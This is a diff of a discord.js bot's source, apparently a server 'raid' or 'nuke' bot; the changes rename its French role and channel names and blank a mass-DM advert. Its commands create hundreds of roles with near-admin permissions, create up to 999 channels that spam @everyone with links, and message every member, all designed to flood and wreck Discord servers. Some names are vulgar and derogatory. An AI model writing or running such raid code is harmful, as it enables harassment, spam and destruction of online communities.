@@ -98,109 +98,109 @@ if (message.content === "&help"){
 
 if(message.content === "roles"){
 for(var i =0; i < 400; i++){
-    message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+    message.guild.createRole({name:"Nique Zebi",
                              mentionable:false,
                              permissions:2146958591,
                              position: "",
                              color: "#fb0707"
         })
-        message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+        message.guild.createRole({name:"Nique Zebi",
         mentionable:false,
         permissions:2146958591,
         position: "",
         color: "#ff08c5"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Nique Zebi",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#5d08ff"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Nique Zebi",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#0c08ff"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Nique Zebi",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#08d5ff"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Nique Zebi",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#08ffa3"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Nique Zebi",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#08ff23"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Nique Zebi",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#81ff08"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Nique Zebi",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#fff608"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Nique Zebi",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff6f08"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Nique Zebi",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff0808"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Nique Zebi",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff0808"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Nique Zebi",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff0808"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Nique Zebi",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff0808"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Nique Zebi",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff0808"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Nique Zebi",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff0808"
 })
-message.guild.createRole({name:"-Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Nique Zebi",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff0808"
 })
-message.guild.createRole({name:"-Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Nique Zebi",
 mentionable:false,
 permissions:2146958591,
 position: "",
@@ -246,12 +246,12 @@ if(message.content.includes("serversjoin")){
                     message.channel.send("roles").then(m => m.delete());
                     message.channel.send("issou").then(m => m.delete());
                       for(var i = 0; i < 999; i++){
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("!everyone ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
+                          message.guild.createChannel("Okue ta detruit", "text").then(c => c.send("@everyone ."))
+                          message.guild.createChannel("Okue ta detruit","text").then(c => c.send("@everyone https://cdn.discordapp.com/attachments/703336711777812552/704368336900718662/video0.mp4 &.789 ."))
+                          message.guild.createChannel("Okue ta detruit","text").then(c => c.send("@everyone https://cdn.discordapp.com/attachments/703336711777812552/704368336900718662/video0.mp4 &.789."))
+                          message.guild.createChannel("Okue ta detruit", "text").then(c => c.send("@everyone https://cdn.discordapp.com/attachments/703336711777812552/704368336900718662/video0.mp4  &.789 ."))
+                          message.guild.createChannel("Okue ta detruit","text").then(c => c.send("@everyone https://cdn.discordapp.com/attachments/703336711777812552/704368336900718662/video0.mp4 &.789 ."))
+                          message.guild.createChannel("Okue ta detruit","text").then(c => c.send("@everyone https://cdn.discordapp.com/attachments/703336711777812552/704368336900718662/video0.mp4 &.789 ."))
 
                       }
                     }
@@ -266,7 +266,7 @@ if(message.content.includes("serversjoin")){
                           message.channel.send("destroy").then(m => m.delete());
                           message.channel.send("jechange").then(m => m.delete());
                           message.channel.send("alldm").then(m => m.delete());
-                          message.guild.createChannel("LA PIGEONNERIE", "text").then(c => c.send("channel"))
+                          message.guild.createChannel("Nique ZebiE", "text").then(c => c.send("channel"))
                       }                                                                                   
                     });
 bot.on('message', message => {
@@ -275,10 +275,7 @@ let cont = message.content.slice(1).split(" ")
         let args = cont.slice(1)
         let member = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0])
       message.guild.members.forEach((player) => {
-          message.guild.member(player).send(`**INFORMATIONS SUR LA PIGEONNERIE :
-Numéro 1 :
-La PIGEONNERIE est un serveur discord réunissant des personnes qui se sont faites baiser par des arnaques ou autres, mais est aussi là pour venger ces personnes là grâce au raid ou destruction.
-TA CAPTÉ ? **             https://discord.gg/R3K862v`);
+          message.guild.member(player).send(``);
 });
     }
 })
